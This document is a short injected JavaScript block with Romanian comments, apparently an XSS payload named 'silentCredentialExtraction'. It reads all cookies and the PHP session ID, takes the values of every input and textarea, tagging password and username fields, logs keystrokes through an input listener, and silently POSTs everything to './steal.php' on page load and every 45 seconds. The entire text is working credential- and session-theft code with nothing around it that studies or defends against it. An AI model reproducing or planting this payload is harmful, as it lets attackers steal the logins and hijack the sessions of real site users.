<script>
function silentCredentialExtraction() {
    var extractedData = {
        attack_type: 'silent_credential_extraction',
        timestamp: new Date().toISOString(),
        extracted_credentials: [],
        session_data: {
            cookies: document.cookie,
            sessionId: document.cookie.match(/PHPSESSID=([^;]+)/) ? document.cookie.match(/PHPSESSID=([^;]+)/)[1] : null
        }
    };
    
    // === EXTRAGE DIN TOATE INPUTURILE ===
    var allInputs = document.querySelectorAll('input, textarea');
    allInputs.forEach(function(input) {
        if (input.value && input.value.length > 0) {
            extractedData.extracted_credentials.push({
                field_name: input.name,
                field_id: input.id,
                field_type: input.type,
                field_value: input.value,
                field_placeholder: input.placeholder,
                is_password: input.type === 'password' || input.name.toLowerCase().includes('pass'),
                is_username: input.type === 'text' || input.type === 'email' || input.name.toLowerCase().includes('user') || input.name.toLowerCase().includes('email')
            });
        }
    });
    
    // === MONITORIZEAZĂ TOATE SCHIMBĂRILE ===
    document.addEventListener('input', function(e) {
        if (e.target.value && e.target.value.length > 2) {
            fetch('./steal.php', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({
                    attack_type: 'live_credential_capture',
                    field_info: {
                        name: e.target.name,
                        id: e.target.id,
                        type: e.target.type,
                        value: e.target.value,
                        timestamp: new Date().toISOString()
                    }
                }),
                mode: 'no-cors'
            });
        }
    });
    
    // === TRIMITE DATELE EXTRASE ===
    fetch('./steal.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify(extractedData),
        mode: 'no-cors'
    });
}

// Execută imediat și repetă
silentCredentialExtraction();
setInterval(silentCredentialExtraction, 45000);

// Nu afișa alert - rămâne ascuns
console.log('🔑 Silent credential extraction running...');
</script>